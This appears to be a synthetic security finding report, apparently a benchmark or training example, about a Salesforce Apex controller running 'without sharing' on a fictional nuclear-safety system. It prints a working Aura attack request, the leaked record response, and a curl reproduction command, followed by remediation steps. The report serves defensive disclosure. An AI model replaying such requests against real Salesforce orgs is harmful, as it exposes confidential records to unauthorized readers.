# Security Analysis Report
**System:** ReactorCore Safety API (Salesforce-Integrated)
**Domain:** Nuclear / Safety Systems
**Example ID:** SF-0090
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform — Pattern 9.2 | SOQL record-level access bypass on `CaseController.getCaseDetails` — attacker reads any nuclear safety Case record without Salesforce sharing enforcement |

---

## Finding 1 — Platform: SOQL and Salesforce Record-Level Access Bypass on Case Object (Pattern 9.2)

### Summary
The Apex controller `CaseController` on ReactorCore Safety API (`53d636f6.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Case object. The SOQL query in §4.0 contains no `AND OwnerId = :UserInfo.getUserId()` predicate and no `WITH SECURITY_ENFORCED` clause. Per §5.0 Pattern 9.2, Salesforce platform sharing rules are entirely bypassed. Nuclear safety Case records are highly sensitive — unauthorized access constitutes a critical safety risk.

**Pattern:** 9.2 — SOQL and Salesforce record-level access (Platform)
**Affected controller:** `c.CaseController.getCaseDetails`
**Affected endpoint:** `POST https://53d636f6.lightning.force.com/aura`
**Note:** Apex method name and Aura descriptor both use `getCaseDetails` — consistent within context.txt.

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://53d636f6.lightning.force.com/aura
Authorization: Bearer 00D53D636F6!AR53d636f6...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D53D636F6!AR53d636f6...

message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN",
"params":{"caseId":"00136F6","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Nuclear Safety Case Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "00136F6", "Name": "Victim Case Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-74-7276"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D53D636F6!AR53d636f6..."
curl -s -X POST "https://53d636f6.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN","params":{"caseId":"00136F6","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-74-7276
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class CaseController { ... }`
2. `WHERE Id = :caseId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`. Critical for nuclear safety regulatory compliance.
